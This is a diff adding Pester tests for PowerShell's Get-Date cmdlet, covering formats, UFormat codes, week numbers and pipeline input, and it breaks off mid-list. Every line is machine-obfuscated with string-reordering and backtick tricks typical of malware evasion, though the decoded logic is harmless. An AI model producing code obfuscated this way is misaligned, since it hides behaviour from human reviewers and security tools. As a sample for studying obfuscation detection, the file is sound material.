@@ -1,0 +1,281 @@
+  &('sv') ("Uiy"+"ft")  ([TYPE]("{2}{0}{1}" -F'meS','PaN','TI'))  ; &("{2}{1}{0}"-f'm','-itE','sET') ("{2}{0}{3}{1}" -f 'BLe','ke','VariA',':V') ( [tYpE]("{2}{0}{1}" -F'atE','TIme','D')) ;  &("{0}{2}{1}" -f 'sE','-ItEM','t')  ("{2}{1}{3}{0}" -f 'dT2','Le','VaRIAb',':8yL')  ([type]("{0}{1}" -F'g','UID') ) ; &("{2}{1}{0}{3}"-f'iA','et-vAR','s','BLe')  ('zm95'+'G') (  [TypE]("{3}{2}{1}{0}"-f'ImE','T','AtE','SysTEm.d') );   $5yh= [TyPE]("{1}{9}{7}{3}{4}{8}{0}{2}{5}{6}" -f 'IzatIoN.c','SY','ul','G','lO','TureI','nfo','em.','BAl','St')  ; &("{2}{0}{1}"-f '-','ItEm','Set')  ("{1}{2}{3}{0}" -f ':1ruy4','VA','RIAbL','e') ([TYPE]("{0}{1}" -F'sTR','InG')  ) ;  &("{0}{1}"-f'S','Et') ('d'+'afw')  ( [tYPe]("{1}{2}{0}" -f'zOnE','T','Ime') ) ;
+
+
+&("{2}{0}{1}"-f 'escri','be','D') ("{6}{0}{3}{4}{5}{2}{1}" -f'et-Dat','Tests','it ','e',' DR','T Un','G') -Tags "CI" {
+    &('It') ("{4}{2}{9}{1}{7}{10}{8}{0}{5}{6}{3}" -f'pr','par','t-Date ','ts','Ge','o','per resul','amete','eturns ','with all ','rs r') {
+        ${Da`Te} =   (&("{2}{1}{0}" -f 'LE','RIAb','VA') ('v'+'ke')  )."vA`lue"::"n`ow" + ( (  &("{2}{1}{0}" -f 'item','-','get')  ('v'+'Ar'+'i'+'aBL'+'e:uIyfT'))."VAl`Ue"::("{1}{0}"-f'ew','n').Invoke(0,0,30))
+        ${r`Es`ULt} = &("{2}{0}{1}"-f't-Dat','e','Ge') -Date ${Da`Te} -Year 1973 -Month 2 -Day 22 -Hour 15 -Minute 40 -Second 10 -Millisecond 200
+        ${r`esuLT} | &("{1}{2}{0}"-f'uld','Sh','o') -BeOfType ("{2}{0}{1}"-f 'tet','ime','Da')
+        ${rES`Ult}."y`Ear" | &("{0}{1}"-f 'S','hould') -Be 1973
+        ${rE`sUlT}."M`ontH"| &("{1}{0}" -f 'hould','S') -Be 2
+        ${r`EsuLt}."d`AY" | &("{0}{1}"-f'S','hould') -Be 22
+        ${reS`U`Lt}."H`OUr" | &("{1}{0}" -f 'uld','Sho') -Be 15
+        ${re`s`UlT}."MiN`UTe" | &("{0}{1}{2}"-f 'S','hou','ld') -Be 40
+        ${r`e`sUlt}."se`CO`Nd" | &("{0}{1}"-f'Sho','uld') -Be 10
+        ${RE`SULT}."mI`LlI`secOnd" | &("{1}{0}" -f'hould','S') -Be 200
+    }
+
+    &('It') ("{2}{1}{10}{6}{5}{7}{3}{11}{4}{12}{9}{8}{0}" -f 'utput','ing -','us','o','s t',' ','layhint','pr','o','rrect ','disp','duce','he co') {
+        ${d} = &("{1}{0}"-f 'ate','Get-d') -Date:("{0}{1}{3}{2}" -f'Jan',' 1, 2','20','0')  -DisplayHint ("{1}{0}" -f'ate','D') | &("{0}{1}{2}{3}" -f'Out-Str','i','n','g')
+        ${D}.("{1}{0}"-f'm','Tri').Invoke() | &("{0}{1}" -f'Shou','ld') -Be ("{5}{2}{3}{0}{6}{4}{1}"-f 'Janua',', 2020','sday,',' ','1','Wedne','ry ')
+    }
+
+    &('It') ("{3}{5}{1}{6}{0}{4}{7}{2}"-f'e','roduces the ','ut','usi','ct','ng -format p','corr',' outp') {
+        &("{0}{2}{1}" -f'Get-','ate','d') -Date:("{0}{2}{1}{3}" -f 'Ja','2','n 1, 20','0')  -Format:("{0}{2}{1}"-f'MMM-d','yy','d-') | &("{0}{1}" -f'Sh','ould') -Be ("{2}{0}{1}{3}" -f 'a','n-0','J','1-20')
+    }
+
+    &('It') ("{1}{8}{3}{5}{9}{4}{2}{0}{7}{6}" -f'r','usi','the cor','g -uformat ','produces ','%s','t','ect outpu','n',' ') {
+        ${se`CoN`ds} = &("{0}{1}" -f'Get','-date') -Date:("{3}{0}{2}{1}"-f' 1, ','0Z','202','Jan') -UFormat:"%s"
+
+        ${S`ecO`NDS} | &("{0}{1}"-f'Sh','ould') -Be ("{1}{2}{0}"-f'36800','157','78')
+        if (${Isl`In`UX}) {
+            ${dA`Testri`Ng} = ("{2}{0}{1}{3}" -f'1/2020',' UT','01/0','C')
+            if ( (&("{1}{3}{2}{0}" -f'o','Get-Pl','nf','atformI')) -eq ("{1}{0}"-f 'e','alpin') ) {
+                ${da`Te`St`RIng} = ("{2}{1}{0}" -f '01-01','0-','202')
+            }
+            ${ExP`e`cTED} = &("{1}{0}"-f'e','dat') (("{1}{3}{2}{4}{0}" -f'g}','--da','St','te=oXd{date','rin')).rEPlACE('oXd',[StRInG][CHAR]36) ("{0}{1}"-f '+','%s')
+            ${S`Econ`ds} | &("{0}{2}{1}"-f 'Sho','ld','u') -Be ${ExP`E`ctED}
+        }
+    }
+
+    &('It') ((("{3}{1}{8}{4}{7}{9}{5}{10}{6}{0}{2}{11}" -f 'produces the c','g','o','usin','ma','d',' ','t Kz',' -ufor','Cym','HKzC','rrect output'))."r`eplA`cE"(([chAr]75+[chAr]122+[chAr]67),[strInG][chAr]39)) {
+        &("{1}{0}" -f 'te','Get-da') -Date ("{0}{1}{3}{2}"-f'0030','-01-01T00:0','00','0:') -uformat ("{3}{2}{1}{0}"-f '/%d-%H','m','/%','%y') | &("{0}{1}"-f 'S','hould') -Be ("{2}{0}{3}{1}" -f'01','00','30/','/01-')
+    }
+
+    &('It') ((("{10}{8}{5}{16}{2}{13}{4}{15}{12}{6}{3}{14}{17}{11}{9}{1}{0}{7}"-f'c','e','b',' ','cCdDehH',' -uformat {','}','t output','ing','rr','us','co','ljmMpr{0','B','produces the','Ik','0}aA',' '))  -f  [cHAR]39) {
+        &("{2}{1}{0}" -f'e','et-dat','G') -Date ("{2}{1}{0}"-f'/0030','1','1/') -uformat ("{5}{1}{2}{4}{3}{6}{0}"-f 'I%k%l%j%m%M%p%r','B%c','%C','%e%','%d%D','%a%A%b%','h%H%') | &("{1}{0}"-f'ld','Shou') -Be ("{12}{17}{1}{21}{16}{15}{4}{6}{20}{7}{5}{11}{2}{10}{3}{22}{19}{0}{13}{9}{8}{14}{18}" -f '1Jan','sda','an ',' 0','ry','01 ','Tu',' ','2','0120010100AM1','0030','J','Tu','0012 ',':0','Janua','n','eTue','0:00 AM','/30 ','e','yJa','0:00:0000101/01')
+    }
+
+    &('It') ((("{7}{11}{3}{5}{1}{14}{15}{13}{10}{6}{4}{0}{2}{8}{12}{9}" -f 'he co','at 7u0sS','r','g','s t',' -uform','uce','usi','r','t output','od','n','ec','XyYZ7u0 pr','tTuU','VwWx'))."Re`PLAcE"(([chAR]55+[chAR]117+[chAR]48),[strinG][chAR]39)) {
+        &("{1}{2}{0}"-f'ate','Get','-d') -Date ("{0}{1}{2}" -f '1/','1/','0030') -uformat ("{0}{1}{2}{3}{4}"-f'%S%T%u%U%w%W','%x%','X','%y%Y','%%') | &("{0}{1}{2}"-f'S','houl','d') -Be ("{3}{0}{6}{2}{5}{1}{4}{7}" -f '020',':00:003','01/300','0000:00:0','000','0','2001/','30%')
+    }
+
+    
+    &('It') ((("{3}{6}{1}{10}{0}{5}{9}{7}{2}{8}{4}"-f 'at','for','rrect o','us','tput',' cU8VcU8 produces the ','ing -u','o','u','c','m'))."R`ePLa`CE"('cU8',[sTRIng][CHAR]39)) -TestCases @(
+        @{("{1}{0}" -f 'te','da')=("{1}{0}{2}"-f '-0','2005-01','1'); ("{1}{0}"-f 'ek','we') = "53"},
+        @{("{0}{1}" -f'da','te')=("{3}{0}{1}{2}" -f '0','05-','01-02','2'); ("{1}{0}"-f 'k','wee') = "53"},
+        @{("{1}{0}" -f 'ate','d')=("{0}{2}{1}" -f'2005-12-','1','3'); ("{1}{0}"-f'ek','we') = "52"},
+        @{("{1}{0}"-f 'e','dat')=("{1}{2}{0}" -f '-01-01','2','006'); ("{1}{0}" -f 'eek','w') = "52"},
+        @{("{1}{0}"-f 'te','da')=("{0}{1}{2}"-f '2','006-01-','02'); ("{0}{1}"-f'w','eek') = "01"},
+        @{("{0}{1}"-f 'dat','e')=("{0}{1}{2}{3}" -f'200','6-','12','-31'); ("{1}{0}"-f 'k','wee') = "52"},
+        @{("{0}{1}" -f 'dat','e')=("{0}{1}{2}"-f'2007','-01-','01'); ("{1}{0}" -f 'ek','we') = "01"},
+        @{("{1}{0}" -f'te','da')=("{0}{1}{3}{2}"-f'200','7','2-30','-1'); ("{0}{1}"-f'wee','k') = "52"},
+        @{("{0}{1}"-f'da','te')=("{0}{3}{2}{1}"-f '20','-12-31','7','0'); ("{0}{1}"-f'we','ek') = "01"},
+        @{("{0}{1}" -f 'da','te')=("{1}{3}{2}{0}"-f'1','2008-0','0','1-'); ("{1}{0}"-f'k','wee') = "01"},
+        @{("{1}{0}" -f'e','dat')=("{2}{0}{1}" -f'8-12-','28','200'); ("{1}{0}"-f 'eek','w') = "52"},
+        @{("{0}{1}" -f'dat','e')=("{2}{3}{1}{0}" -f '2-29','-1','2','008'); ("{0}{1}" -f 'wee','k') = "01"},
+        @{("{0}{1}" -f 'd','ate')=("{1}{2}{0}" -f '2-30','2008-','1'); ("{0}{1}"-f'w','eek') = "01"},
+        @{("{0}{1}"-f'da','te')=("{2}{1}{0}" -f'-31','-12','2008'); ("{1}{0}"-f 'k','wee') = "01"},
+        @{("{0}{1}"-f 'dat','e')=("{1}{2}{0}" -f'-01','2','009-01'); ("{1}{0}" -f'ek','we') = "01"},
+        @{("{1}{0}"-f'e','dat')=("{1}{0}{2}" -f'-12','2009','-31'); ("{1}{0}"-f 'eek','w') = "53"},
+        @{("{0}{1}"-f'da','te')=("{0}{2}{1}" -f '2','1','010-01-0'); ("{1}{0}"-f 'k','wee') = "53"},
+        @{("{0}{1}"-f 'd','ate')=("{2}{1}{0}" -f '2','01-0','2010-'); ("{1}{0}"-f 'k','wee') = "53"},
+        @{("{1}{0}"-f 'ate','d')=("{1}{2}{0}" -f '01-03','201','0-'); ("{1}{0}" -f 'k','wee') = "53"},
+        @{("{1}{0}"-f 'e','dat')=("{1}{2}{0}" -f'-04','2010','-01'); ("{0}{1}"-f'we','ek') = "01"}
+    ) {
+        param(${D`Ate}, ${wE`ek})
+        &("{1}{0}{2}"-f 't','Ge','-date') -Date ${d`ATe} -uformat ('%V') | &("{0}{1}" -f'Sho','uld') -BeExactly ${W`eEk}
+    }
+
+    &('It') ((("{5}{14}{10}{6}{2}{1}{0}{11}{4}{8}{12}{3}{9}{13}{7}" -f 'rm','fo','0} to -u','s ','ro','Passing {0}','{','ve error','d','a descript','me>','at p','uce','i','<na')) -f  [cHaR]39) -TestCases @(
+        @{ ("{0}{1}"-f 'nam','e') = "`$null"      ; ("{1}{0}"-f'lue','va') = ${nU`LL} }
+        @{ ("{1}{0}" -f 'ame','n') = ("{1}{2}{3}{0}"-f'ing','emp','ty s','tr'); ("{0}{1}" -f'v','alue') = "" }
+    ) {
+        param(${vA`l`Ue})
+        { &("{1}{0}{2}"-f't-d','Ge','ate') -Date ("{0}{1}" -f'1/1/1','970') -uformat ${vA`Lue} -ErrorAction ("{0}{1}" -f 'S','top') } | &("{2}{1}{0}"-f 'd','l','Shou') -Throw -ErrorId ("{7}{1}{16}{11}{12}{17}{9}{14}{4}{13}{10}{15}{5}{3}{0}{6}{8}{2}"-f 'tD','met','mmand','e','o','l.Commands.G','a','Para','teCo','Mi','we','gumentValid','atio','soft.Po','cr','rShel','erAr','nError,')
+    }
+
+    &('It') ("{2}{6}{4}{0}{5}{1}{3}"-f'e work','ipeline inp','G','ut','at','s with p','et-d') {
+        ${X} = &("{1}{0}{2}"-f 'bj','new-o','ect') ("{6}{2}{1}{0}{3}{5}{4}" -f'om','ement.Aut','ystem.Manag','ation','bject','.PSO','S')
+        ${X} | &("{0}{1}{2}" -f'a','dd','-member') ("{2}{1}{0}" -f 'roperty','teP','No') ("{1}{0}" -f 'e','Dat') ( (  &("{0}{2}{1}" -f 'get','bLE','-vaRiA')  ("{0}{1}"-f 'Vk','E') -vAlUEoNl )::"n`oW")
+        ${Y} = @(${X},${X})
+        (${y} | &("{2}{0}{1}" -f'at','e','Get-d'))."Leng`Th" | &("{0}{1}{2}"-f 'Sho','ul','d') -Be 2
+    }
+
+    &('It') ("{2}{6}{1}{12}{4}{5}{11}{7}{8}{3}{10}{0}{9}"-f 'pel','Wr','the Las','s with ','Time al','ia','t','wor','k','ine input','pi','s ','ite') {
+        ${f`o`lDER} = ("{0}{2}{1}" -f'Get','eTest','Dat')
+        ${pATH`StrI`Ng} = &("{1}{2}{0}"-f'ath','Join-','P') -Path ${t`esT`dRI`Ve} -ChildPath ${f`older}
+        &("{0}{1}" -f'New-It','em') -Path ${T`eSTdrI`Ve} -Name ${F`O`lDER} -ItemType ("{0}{1}{2}" -f'd','irec','tory') -Force
+        for(${i} = 0; ${I} -lt 10; ${I}++)
+        {
+            ${T`eMp} =   $8YLdT2::("{0}{1}" -f'NewG','uid').Invoke()
+            ${p`Ath`s`TRinG2} = &("{2}{1}{0}"-f'th','in-Pa','Jo') -Path ${patHST`R`iNg} -ChildPath ${tE`Mp}
+            &("{1}{0}"-f 'w-Item','Ne') -Path ${pA`Th`StRInG} -Name ${T`eMP} -ItemType ("{1}{0}" -f'ile','f') -Force
+
+            for(${J} = 0; ${j} -lt 100; ${j}++)
+            {
+                &("{1}{0}{2}" -f'nte','Add-Co','nt') -Path ${PAT`hs`TRI`NG2} -Value ${J}
+            }
+
+        }
+
+        ${RESuL`T1} = &("{1}{0}{2}" -f 'ild','get-ch','item') -path ${pAT`H`STRing} | &("{1}{0}"-f 'et-date','g')
+        ${Res`U`LT2} = &("{4}{0}{2}{3}{1}" -f'et-ch','em','ild','it','g') -path ${p`AT`HST`RiNg} | &("{2}{0}{1}"-f 'et-da','te','g')
+
+        ${Res`UL`T1}."LEnG`Th" | &("{0}{1}" -f 'Shoul','d') -Be 10
+        ${ReSu`lt1}."l`eNGTH" -eq ${R`E`SulT2}."LeN`gTH" | &("{1}{0}"-f 'd','Shoul') -BeTrue
+
+        for(${i} = 0; ${i} -lt ${RESuL`T1}."LeN`gTH"; ${I}++)
+        {
+            ${R`esuLT1}[${i}] -eq ${RES`UL`T2}[${I}] | &("{0}{1}{2}" -f 'Sh','oul','d') -BeTrue
+        }
+
+        &("{0}{1}{2}" -f'Get-C','h','ildItem') -Path ${pAthS`Tr`i`Ng} | &("{1}{0}{2}" -f'e','R','move-Item')
+        &("{2}{1}{0}" -f'em','t','Remove-I') -Path ${P`At`HsTr`ING} -Force -Recurse
+    }
+
+}
+
+&("{1}{0}{2}" -f'ib','Descr','e') ("{1}{0}{2}" -f'et-D','G','ate') -Tags "CI" {
+    &('It') ("{3}{5}{1}{0}{4}{2}" -f 'w','ileDate ','s','-','ork','Format F') {
+        &("{1}{2}{0}"-f'te','Get','-da') -Date ("{1}{4}{7}{5}{2}{0}{3}{6}"-f':02:0','0','1T01','3.','03','-0','0004','0-01') -Format ("{0}{1}{2}"-f'Fi','leD','ate') | &("{1}{0}{2}" -f 'u','Sho','ld') -Be ("{1}{0}{2}"-f '0300','0','101')
+    }
+
+    &('It') ("{3}{1}{4}{2}{0}"-f'ks','orm','r','-F','at FileDateTime wo') {
+        &("{1}{2}{0}" -f'ate','Get','-d') -Date ("{5}{4}{2}{1}{0}{3}" -f'.','3','01:02:0','0004','01-01T','0030-') -Format ("{2}{1}{3}{0}" -f'ateTime','le','Fi','D') | &("{0}{1}" -f'S','hould') -Be ("{0}{1}{3}{2}" -f '00300','101T','04','01020300')
+    }
+
+    &('It') ("{7}{5}{1}{6}{3}{4}{0}{2}" -f 'rsal','t',' works','DateTimeU','nive','ma',' File','-For') {
+        &("{1}{2}{0}"-f'te','Get','-da') -Date ("{4}{6}{0}{3}{5}{2}{1}" -f '1','4z','0','T01:02:03.','0030','00','-01-0') -Format ("{2}{0}{3}{1}{4}"-f 'ileDat','me','F','eTi','Universal') | &("{1}{2}{0}" -f'ould','S','h') -Be ("{1}{2}{4}{6}{0}{5}{3}"-f '0','00','30','04Z','0101T0','20300','1')
+    }
+
+    &('It') ("{1}{2}{4}{6}{3}{7}{5}{0}" -f's','-','Format FileDateT','l wo','imeUn','k','iversa','r') {
+        &("{0}{2}{1}"-f'Ge','-date','t') -Date ("{4}{0}{3}{1}{2}"-f'030-','-01T01:','02:03.0004z','01','0') -Format ("{2}{0}{1}{4}{3}" -f 'ileDateU','nive','F','al','rs') | &("{1}{0}" -f 'hould','S') -Be ("{0}{2}{1}" -f'0','300101Z','0')
+    }
+
+    &('It') ("{2}{5}{10}{6}{3}{11}{12}{7}{1}{8}{0}{4}{13}{9}{14}" -f'ho','ToString','S','e colo','d','ho','v','n ',' met','s','uld ha','ns w','he',' is u','ed') {
+        (&("{0}{1}{2}"-f'Ge','t-Da','te')).("{1}{0}" -f 'oString','T').Invoke().("{1}{0}{2}"-f'n','Co','tains').Invoke(":")                   | &("{1}{0}"-f 'd','Shoul') -BeTrue
+        (&("{1}{0}"-f'et-Date','G') -DisplayHint ("{1}{0}" -f'ime','T')).("{2}{0}{1}"-f 'in','g','ToStr').Invoke().("{0}{1}" -f 'Contain','s').Invoke(":") | &("{0}{1}" -f'Sho','uld') -BeTrue
+        (&("{0}{1}"-f'Get-','Date') -DisplayHint ("{0}{1}" -f 'Da','te')).("{1}{0}{2}" -f't','ToS','ring').Invoke().("{1}{0}{2}"-f 'n','Contai','s').Invoke(":") | &("{0}{2}{1}"-f'Shou','d','l') -BeTrue
+    }
+
+    &('It') ("{6}{9}{7}{1}{10}{0}{8}{3}{5}{2}{4}" -f 'to','be ab','at','he',' flag',' form','Sho',' ',' use t','uld','le ') {
+        
+
+        (&("{1}{0}"-f 'ate','Get-D') -Format ('d')).("{0}{1}{2}"-f'Conta','in','s').Invoke("/") | &("{1}{2}{0}"-f 'uld','Sh','o') -BeTrue
+        (&("{1}{0}{2}" -f 'et-','G','Date') -Format ('D')).("{2}{1}{0}" -f 'ains','t','Con').Invoke(",") | &("{1}{0}" -f'd','Shoul') -BeTrue
+        (&("{2}{1}{0}" -f 'te','Da','Get-') -Format ('f')).("{1}{2}{0}"-f 'ins','C','onta').Invoke(",") -and (&("{1}{0}{2}"-f'e','G','t-Date') -Format ('f')).("{0}{2}{1}"-f 'Co','ains','nt').Invoke(":") | &("{1}{0}" -f'ould','Sh') -BeTrue
+        (&("{1}{0}" -f'ate','Get-D') -Format ('F')).("{0}{2}{1}" -f'Co','tains','n').Invoke(",") -and (&("{2}{0}{1}" -f't-D','ate','Ge') -Format ('F')).("{1}{2}{0}"-f'ains','Co','nt').Invoke(":") | &("{1}{2}{0}"-f'ld','Sh','ou') -BeTrue
+        (&("{1}{0}"-f'-Date','Get') -Format ('g')).("{2}{1}{0}" -f 'ns','ai','Cont').Invoke("/") -and (&("{1}{2}{0}"-f'Date','Get','-') -Format ('g')).("{1}{0}{2}" -f 'tai','Con','ns').Invoke(":") | &("{1}{0}"-f'hould','S') -BeTrue
+        (&("{0}{1}" -f 'Get-Dat','e') -Format ('G')).("{2}{0}{1}"-f 't','ains','Con').Invoke("/") -and (&("{2}{0}{1}" -f'et-D','ate','G') -Format ('G')).("{2}{0}{1}"-f'a','ins','Cont').Invoke(":") | &("{0}{1}" -f'Sho','uld') -BeTrue
+        (&("{1}{2}{0}" -f'-Date','G','et') -Format ('m')).("{2}{1}{0}"-f 'ins','ta','Con').Invoke(",") -or `
+        (&("{1}{0}{2}" -f 't','Ge','-Date') -Format ('m')).("{1}{0}{2}" -f'i','Conta','ns').Invoke(":")  -or `
+        (&("{1}{0}"-f 'et-Date','G') -Format ('m')).("{2}{0}{1}"-f 'tain','s','Con').Invoke("/") | &("{0}{1}{2}"-f'Sho','ul','d') -BeFalse
+    }
+
+    &('It') ("{19}{12}{16}{17}{15}{3}{9}{1}{11}{8}{20}{5}{18}{6}{4}{10}{2}{0}{14}{7}{13}"-f 't datetime from the sy','t','c','k','he corr','et','n t',' ','c',' tha','e',' Get-Date ','ou','time','stem','c','ld',' che','ur','Sh','an r') {
+        ${tiMed`ifFe`Ren`cE} = $(&("{0}{1}{2}"-f 'Get-Da','t','e')).("{2}{1}{0}"-f 'act','ubtr','S').Invoke( ( &("{0}{1}" -f 'vA','RiABle') ('ZM95'+'G') )."v`ALue"::"N`oW")
+
+        ${t`IMED`I`FFERENCE}."d`AyS"         | &("{0}{1}"-f'Sh','ould') -Be 0
+        ${TI`m`ED`iFFeR`ence}."HoU`RS"        | &("{0}{1}"-f 'Shou','ld') -Be 0
+        ${tI`me`diffe`ReNCe}."miNut`ES"      | &("{0}{2}{1}" -f'S','uld','ho') -Be 0
+        ${t`iMeDIFf`ErE`NCe}."miL`LIsE`Co`NDs" | &("{0}{1}" -f 'Shou','ld') -BeLessThan 1
+        ${TImeDIfF`ER`enCE}."T`iCks"        | &("{1}{0}" -f'd','Shoul') -BeLessThan 10000
+    }
+}
+
+&("{1}{0}{2}"-f 'escr','D','ibe') ("{4}{1}{0}{5}{3}{2}" -f'Dat','t-','rmat tests','UFo','Ge','e -') -Tags "CI" {
+    &("{2}{1}{0}"-f'l','foreAl','Be') {
+        ${DAT`E1} = &("{1}{0}{2}"-f'et-dat','G','e') -Date ("{0}{1}{3}{2}" -f'20','30-4-',' 1:2:3.09','5')
+        ${d`Ate2} = &("{0}{2}{1}" -f'Get','ate','-d') -Date ("{2}{0}{1}" -f '30-4-','15 13:2:3','20')
+        ${da`Te3} = &("{2}{1}{0}" -f 'ate','d','Get-') -Date ("{1}{0}{2}{3}{4}{5}"-f '0-4-','203','15 21:','2',':','3')
+
+        
+        ${s`HorT`DAY1} =   (&("{1}{0}" -f'I','gc') ('vaRi'+'aBLe'+':5y'+'h') )."va`LuE"::"C`Urr`ENtcUltU`Re"."D`A`TEtImEfOrMat"."ABBRE`ViATed`d`AyNa`mES"[5]
+        ${FUl`LDa`Y1} =   (  &("{0}{1}"-f 'I','TEm')  ('VaRIabL'+'E:'+'5Y'+'H'))."Va`LuE"::"Cu`RRe`NtCUL`T`Ure"."d`AtEti`m`ef`orMAt"."dAYNA`meS"[5]
+
+        
+        ${sHoRTM`O`Nth1} =   (&("{0}{1}" -f 'DI','r')  ("va"+"R"+"iaBle:5"+"YH") )."vA`LUe"::"curRe`NTculT`URE"."d`A`TeTIMEfOrm`At"."AbB`REVIaTE`DM`oNt`hNa`mEs"[3]
+        ${FU`ll`MoNth1} =  $5yH::"C`URrEn`T`cultUrE"."dA`Te`Tim`Ef`oRmaT"."MO`Nth`NAmes"[3]
+
+        ${full`DA`TE1} = ${d`AtE1}."To`STrING"("$([System.Globalization.CultureInfo]::CurrentCulture.DateTimeFormat.ShortDatePattern)")
+        ${F`U`LlT`ime1} = ${da`TE1}."T`OsT`RiNG"("$([System.Globalization.CultureInfo]::CurrentCulture.DateTimeFormat.LongTimePattern)")
+
+        ${AMUP`pE`R1} =  (  &("{0}{2}{1}"-f 'Get','E','-vARiaBL')  ("{0}{1}"-f '5y','h') )."v`AluE"::"cuRRenTcUlT`U`RE"."DaTeTi`Me`Form`At"."amdE`s`iGnATOR"
+        ${A`ML`OwEr1} =  (&("{1}{0}{2}" -f'T-i','gE','tEM') ('v'+'aRiABLE:5y'+'H')  )."vAl`UE"::"CURR`eNTC`U`LTURE"."daTetIME`F`O`R`mAt"."A`mdesi`GNaTor".("{0}{1}" -f 'T','oLower').Invoke()
+        ${TIme`zo`NE1} =   (&("{0}{1}" -f'Gc','i') ("{2}{0}{1}" -f'ARi','AblE:1RuY4','v')  )."V`AlUE"::("{1}{2}{0}" -f'at','Fo','rm').Invoke("{0:+00;-00}",  (  &("{1}{0}" -f 'm','Ite')  ("vaRia"+"B"+"le"+":DAfw")  )."v`AlUE"::"C`URRe`NtTiME`zOne".("{1}{3}{0}{2}" -f'ffs','GetU','et','tcO').Invoke( ${d`ATe1} )."H`Ours")
+    }
+
+    &('It') ("{2}{6}{3}{5}{4}{1}{0}" -f '>','mat','G','te -UFormat','for',' <','et-Da') -TestCases @(
+            
+            
+            
+            
+            @{ ("{0}{1}"-f 'dat','e') = ${da`TE1}; ("{1}{2}{0}" -f't','form','a') = "%a"; ("{0}{1}" -f'resul','t') = ${s`hor`Tda`y1} }  
+            @{ ("{0}{1}"-f'da','te') = ${DAt`e1}; ("{1}{0}"-f'ormat','f') = "%A"; ("{0}{1}" -f're','sult') = ${FULl`D`AY1} }   
+            @{ ("{0}{1}" -f'da','te') = ${DA`T`E1}; ("{2}{0}{1}" -f 'orma','t','f') = "%b"; ("{1}{0}" -f 't','resul') = ${shorT`mo`Nth1} }
+            @{ ("{0}{1}"-f 'd','ate') = ${D`AT`E1}; ("{0}{2}{1}"-f'form','t','a') = "%B"; ("{2}{0}{1}"-f 'es','ult','r') = ${fUlLmON`T`H1} } 
+            @{ ("{1}{0}"-f'e','dat') = ${DAT`e1}; ("{0}{1}" -f'f','ormat') = "%c"; ("{0}{1}"-f 'r','esult') = ("$shortDay1 "+'0'+'5 '+"$shortMonth1 "+'203'+'0 '+'01:02'+':0'+'3') } 
+                                                                    
+                                                                    
+            @{ ("{0}{1}"-f'd','ate') = ${DaT`e1}; ("{1}{0}"-f 'at','form') = "%C"; ("{0}{1}"-f 'resu','lt') = "20" }        
+            @{ ("{0}{1}"-f 'da','te') = ${Da`Te1}; ("{0}{1}"-f 'for','mat') = "%d"; ("{1}{0}{2}" -f'u','res','lt') = "05" }        
+            @{ ("{1}{0}"-f 'te','da') = ${dA`T`E1}; ("{1}{0}"-f 't','forma') = "%D"; ("{0}{1}"-f 'r','esult') = ("{2}{1}{0}"-f'/05/30','4','0') }  
+            @{ ("{0}{1}"-f'd','ate') = ${DAT`E1}; ("{0}{1}{2}" -f 'f','orm','at') = "%e"; ("{1}{0}" -f'esult','r') = " 5" }        
+            @{ ("{1}{0}"-f'e','dat') = ${DAT`e2}; ("{1}{0}" -f't','forma') = "%e"; ("{0}{1}" -f'resul','t') = "15" }
+            @{ ("{1}{0}" -f'te','da') = ${dAt`E1}; ("{2}{1}{0}" -f 'at','orm','f') = "%F"; ("{0}{1}" -f 'resu','lt') = ("{0}{2}{1}"-f '2','-04-05','030') }
+            
+                                                                    
+                                                                    
+            
+                                                                    
+                                                                    
+            @{ ("{0}{1}"-f'd','ate') = ${Da`T`e1}; ("{0}{2}{1}" -f 'for','at','m') = "%h"; ("{0}{1}" -f 'resu','lt') = ${S`hortmOnT`h1} }
+            @{ ("{0}{1}" -f 'dat','e') = ${D`AT`e1}; ("{0}{1}{2}" -f 'f','orma','t') = "%H"; ("{0}{1}"-f'resu','lt') = "01" }        
+            @{ ("{0}{1}" -f 'da','te') = ${D`Ate2}; ("{0}{1}" -f 'for','mat') = "%H"; ("{0}{1}"-f'r','esult') = "13" }
+            @{ ("{1}{0}" -f'ate','d') = ${d`AT`e1}; ("{2}{1}{0}"-f't','a','form') = "%I"; ("{1}{0}" -f'ult','res') = "01" }        
+            @{ ("{1}{0}" -f'e','dat') = ${Dat`E2}; ("{0}{1}{2}"-f 'for','ma','t') = "%I"; ("{1}{0}" -f 'esult','r') = "01" }
+            @{ ("{0}{1}" -f'd','ate') = ${Da`T`E1}; ("{0}{1}{2}"-f 'f','or','mat') = "%j"; ("{1}{0}"-f 'lt','resu') = "095" }       
+            @{ ("{1}{0}" -f 'e','dat') = ${d`AT`E1}; ("{1}{0}" -f't','forma') = "%k"; ("{2}{1}{0}" -f't','ul','res') = " 1" }        
+            @{ ("{0}{1}" -f'da','te') = ${dA`TE2}; ("{1}{0}" -f 'ormat','f') = "%k"; ("{1}{2}{0}"-f 'ult','re','s') = "13" }
+            @{ ("{0}{1}"-f'dat','e') = ${d`A`TE1}; ("{1}{0}" -f 'rmat','fo') = "%l"; ("{1}{0}"-f'sult','re') = " 1" }        
+            @{ ("{0}{1}" -f'da','te') = ${D`AT`e2}; ("{1}{0}" -f 'ormat','f') = "%l"; ("{1}{0}"-f'ult','res') = " 1" }
+            @{ ("{0}{1}" -f'dat','e') = ${D`ATe1}; ("{0}{1}" -f 'fo','rmat') = "%m"; ("{0}{1}"-f 'resul','t') = "04" }        
+            @{ ("{1}{0}"-f'ate','d') = ${D`AtE1}; ("{1}{0}" -f 'rmat','fo') = "%M"; ("{0}{1}"-f 're','sult') = "02" }        
+            
+            
+            @{ ("{1}{0}" -f 'e','dat') = ${DaT`e1}; ("{0}{1}" -f'for','mat') = "%p"; ("{1}{0}" -f'sult','re') = ${am`UP`p`eR1} }   
+            
+            
+            @{ ("{0}{1}" -f 'd','ate') = ${d`A`TE1}; ("{1}{0}{2}" -f'rm','fo','at') = "%r"; ("{1}{0}{2}"-f 's','re','ult') = ("{1}{0}{3}{2}" -f':0','01','M','2:03 A') }
+            @{ ("{0}{1}"-f 'da','te') = ${d`At`e3}; ("{0}{1}" -f 'forma','t') = "%r"; ("{1}{0}"-f 'sult','re') = ("{3}{2}{0}{1}"-f':0','2:03 PM','9','0') }
+            @{ ("{1}{0}" -f 'te','da') = ${dA`T`E1}; ("{0}{1}" -f'fo','rmat') = "%R"; ("{0}{1}" -f'resu','lt') = ("{0}{1}" -f'0','1:02') }     
+            @{ ("{0}{1}" -f'da','te') = ${DAT`e3}; ("{0}{1}" -f 'for','mat') = "%R"; ("{0}{1}"-f 'resul','t') = ("{1}{0}"-f':02','21') }
+            
+                                                                    
+                                                                    
